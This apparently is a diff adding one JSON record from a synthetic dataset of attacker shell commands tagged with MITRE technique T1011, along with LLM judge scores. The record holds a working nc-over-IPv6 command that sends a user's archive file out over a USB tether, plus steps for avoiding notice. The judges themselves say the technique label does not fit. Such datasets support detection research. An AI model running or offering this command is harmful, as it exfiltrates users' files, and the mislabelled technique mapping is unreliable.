@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1011",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "nohup tcpdump -i usb0 -nn 'ip6 and tcp port 54531' -U -w /dev/null >/dev/null 2>&1 & nc -6 -s fe80::a00:27ff:fe12:3456%usb0 fe80::2%usb0 54531 < /home/user/.local/share/archive.tgz",
+  "explanation": "Uses IPv6 over a USB tether interface (usb0) to exfiltrate via a non-standard TCP port, monitored narrowly by tcpdump. This is a separate medium and protocol path consistent with T1011.",
+  "rationale_steps": [
+    "Constrain traffic to IPv6 on usb0 to avoid the primary IPv4 LAN.",
+    "Use high TCP port 54531 to minimize notice.",
+    "Run tcpdump with an IPv6 filter and discard capture.",
+    "nc -6 with a scoped link-local source ties the flow to usb0."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1011-a2471e69-182a2b43",
+  "source_prompt_hash": "a2471e69",
+  "timestamp_utc": "2025-09-30T08:19:52.942834Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with proper syntax, balanced quotes, valid flags for both tcpdump and netcat, correct command separators, and proper redirection operators.",
+        "semantic_score": 3,
+        "semantic_justification": "While the command does implement data exfiltration over IPv6 via USB interface, it doesn't align with T1011 (Search Closed Sources) which involves acquiring intelligence from non-public sources rather than exfiltrating data.",
+        "combined_score": 4.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T13:23:08.280982Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with valid commands, flags, arguments, balanced quoting, and proper command separators and redirections.",
+        "semantic_score": 1,
+        "semantic_justification": "The command describes exfiltration of data, which fundamentally mismatches T1011 'Search Closed Sources' (data acquisition), and the `tcpdump` component would likely fail due to insufficient privileges.",
+        "combined_score": 3.0,
+        "confidence": 1,
+        "timestamp": "2025-10-02T13:23:24.233909Z"
+      },
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed single-line command with balanced quoting, valid options, correct redirections, and proper backgrounding using &.",
+        "semantic_score": 1,
+        "semantic_justification": "Implements IPv6 data exfiltration with tcpdump monitoring, which is unrelated to the provided technique description of 'Search Closed Sources' (T1011 here).",
+        "combined_score": 3.0,
+        "confidence": 0.8,
+        "timestamp": "2025-10-02T13:24:13.473415Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 1.667,
+    "llm_average_score": 3.333,
+    "llm_verdict": "likely_mismatch",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
